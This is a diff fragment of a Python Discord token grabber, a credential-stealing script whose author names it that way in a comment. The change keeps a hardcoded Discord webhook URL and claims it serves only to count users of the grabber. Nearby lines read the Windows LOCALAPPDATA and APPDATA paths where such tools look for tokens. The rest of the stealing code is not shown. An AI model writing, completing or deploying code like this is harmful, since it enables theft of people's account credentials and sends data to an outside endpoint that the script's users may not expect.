@@ -9,8 +9,8 @@ from urllib.request import Request, urlopen
 from threading import Thread
 from time import sleep
 from sys import argv
-
-WEBHOOK_URL = "https://canary.discord.com/api/webhooks/844249895783235654/h8ZiGpZr_-h79PvzeXMBuL_5-ssQqDVerfXdQautDKsuL3zfD0VuNTxJcveoMx4vYVjD"  # Insert webhook url here
+#below, the wehbook is only to know how many people are using my token grabber, you can change the whebook ! 
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/844249895783235654/h8ZiGpZr_-h79PvzeXMBuL_5-ssQqDVerfXdQautDKsuL3zfD0VuNTxJcveoMx4vYVjD"  
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
